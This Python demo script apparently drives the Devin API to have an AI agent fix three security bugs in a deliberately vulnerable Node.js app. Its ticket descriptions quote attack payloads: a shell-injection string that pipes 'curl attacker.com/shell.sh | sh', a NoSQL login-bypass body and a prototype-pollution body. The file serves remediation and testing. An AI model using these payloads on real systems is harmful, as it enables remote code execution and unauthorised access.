#!/usr/bin/env python3
"""
Devin API — L3 Bug Triage Demo
================================
Demonstrates invoking the Devin API to create sessions that investigate and fix
L3-level security bugs, simulating an automated incident-response workflow.

Usage:
    export DEVIN_API_KEY="your-api-key"
    python3 trigger_devin_triage.py

Flow:
    1. A support ticket arrives (simulated as a dict).
    2. This script calls POST /v1/sessions with a detailed prompt.
    3. Devin investigates the codebase, identifies the root cause, and opens a PR.
    4. The script polls for completion and prints the result.
"""

import os
import sys
import time

try:
    import requests
except ImportError:
    sys.exit("requests library required: pip install requests")

API_BASE = "https://api.devin.ai/v1"
API_KEY = os.environ.get("DEVIN_API_KEY", "")
REPO_URL = "https://github.com/COG-GTM/nodejs-goof"

TICKETS = [
    {
        "id": "TICKET-4501",
        "severity": "Critical",
        "title": "Remote Code Execution via TODO image processing",
        "description": (
            "An attacker can achieve remote code execution by submitting a "
            "crafted TODO item containing a Markdown image tag. The server "
            "passes the URL directly to `child_process.exec('identify ' + url)` "
            "in routes/index.js, allowing shell metacharacter injection. "
            "For example: `![alt text](http://x.co/img.png; curl attacker.com/shell.sh | sh \"title\")`"
        ),
        "prompt_template": (
            "You are investigating a critical security ticket.\n\n"
            "## Ticket: {id} — {title}\n"
            "Severity: {severity}\n\n"
            "### Description\n{description}\n\n"
            "### Instructions\n"
            "1. Clone {repo} and examine `routes/index.js`, specifically the `exports.create` handler.\n"
            "2. Identify where `exec()` is called with unsanitized user input.\n"
            "3. Fix the command injection by replacing `exec()` with `execFile()` and passing the URL as an argument array.\n"
            "4. Write a test in `tests/security-fixes.test.js` proving that shell metacharacters are not interpreted.\n"
            "5. Create a PR with the fix."
        ),
    },
    {
        "id": "TICKET-4502",
        "severity": "Critical",
        "title": "NoSQL Injection allows authentication bypass on /login",
        "description": (
            "The POST /login endpoint passes req.body directly to "
            "MongoDB User.find() without type-checking the fields. An attacker "
            "can send `{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}` "
            "to bypass authentication entirely and gain admin access."
        ),
        "prompt_template": (
            "You are investigating a critical security ticket.\n\n"
            "## Ticket: {id} — {title}\n"
            "Severity: {severity}\n\n"
            "### Description\n{description}\n\n"
            "### Instructions\n"
            "1. Clone {repo} and examine `routes/index.js`, specifically `exports.loginHandler`.\n"
            "2. Identify how req.body.username and req.body.password are passed directly to User.find().\n"
            "3. Fix: explicitly extract username and password, and reject requests where they are not strings.\n"
            "4. Write tests proving that object-type inputs (NoSQL operators) are rejected.\n"
            "5. Create a PR with the fix."
        ),
    },
    {
        "id": "TICKET-4503",
        "severity": "High",
        "title": "Prototype Pollution via chat message endpoint",
        "description": (
            "The PUT /chat endpoint uses lodash _.merge() to combine user-supplied "
            "message data into a server-side object. An attacker can send "
            "`{\"message\": {\"__proto__\": {\"isAdmin\": true}}}` to pollute "
            "Object.prototype, potentially escalating privileges or causing DoS "
            "across all subsequent requests."
        ),
        "prompt_template": (
            "You are investigating a high-severity security ticket.\n\n"
            "## Ticket: {id} — {title}\n"
            "Severity: {severity}\n\n"
            "### Description\n{description}\n\n"
            "### Instructions\n"
            "1. Clone {repo} and examine `routes/index.js`, specifically `exports.chat.add`.\n"
            "2. Identify the `_.merge(message, req.body.message, ...)` call.\n"
            "3. Fix: sanitize user input by stripping `__proto__`, `constructor`, and `prototype` keys before merging.\n"
            "4. Write tests proving that prototype pollution payloads are neutralized.\n"
            "5. Create a PR with the fix."
        ),
    },
]


def create_session(ticket):
    """Create a Devin session for a single support ticket."""
    prompt = ticket["prompt_template"].format(
        id=ticket["id"],
        title=ticket["title"],
        severity=ticket["severity"],
        description=ticket["description"],
        repo=REPO_URL,
    )

    payload = {
        "prompt": prompt,
        "idempotent": True,
    }

    print(f"\n{'='*60}")
    print(f"Creating session for {ticket['id']}: {ticket['title']}")
    print(f"Severity: {ticket['severity']}")
    print(f"{'='*60}")

    resp = requests.post(
        f"{API_BASE}/sessions",
        headers={
            "Authorization": f"Bearer {API_KEY}",
            "Content-Type": "application/json",
        },
        json=payload,
    )
    resp.raise_for_status()
    data = resp.json()

    session_id = data["session_id"]
    session_url = data.get("url", f"https://app.devin.ai/sessions/{session_id}")
    print(f"  Session ID : {session_id}")
    print(f"  Session URL: {session_url}")
    return session_id, session_url


def poll_session(session_id, timeout_minutes=30):
    """Poll a session until it reaches a terminal state."""
    deadline = time.time() + timeout_minutes * 60
    backoff = 5

    while time.time() < deadline:
        resp = requests.get(
            f"{API_BASE}/sessions/{session_id}",
            headers={"Authorization": f"Bearer {API_KEY}"},
        )
        resp.raise_for_status()
        data = resp.json()
        status = data.get("status_enum", data.get("status"))
        print(f"  [{session_id[:12]}] status: {status}")

        if status in ("finished", "blocked", "stopped"):
            pr = data.get("pull_request")
            if pr:
                print(f"  PR created: {pr.get('url', 'N/A')}")
            return data

        time.sleep(min(backoff, 30))
        backoff = min(backoff * 1.5, 30)

    print(f"  [{session_id[:12]}] timed out after {timeout_minutes}m")
    return None


def main():
    if not API_KEY:
        sys.exit("Error: Set DEVIN_API_KEY environment variable.")

    print("Devin API — L3 Bug Triage Demo")
    print(f"Target repo: {REPO_URL}")
    print(f"Tickets to process: {len(TICKETS)}\n")

    sessions = []
    for ticket in TICKETS:
        sid, url = create_session(ticket)
        sessions.append({"ticket": ticket, "session_id": sid, "url": url})

    print(f"\nAll {len(sessions)} sessions created. Polling for results...\n")

    for entry in sessions:
        result = poll_session(entry["session_id"])
        entry["result"] = result

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    for entry in sessions:
        ticket = entry["ticket"]
        result = entry.get("result") or {}
        status = result.get("status_enum", "unknown")
        pr = result.get("pull_request", {})
        print(f"  {ticket['id']} | {status:10s} | PR: {pr.get('url', 'N/A')}")


if __name__ == "__main__":
    main()
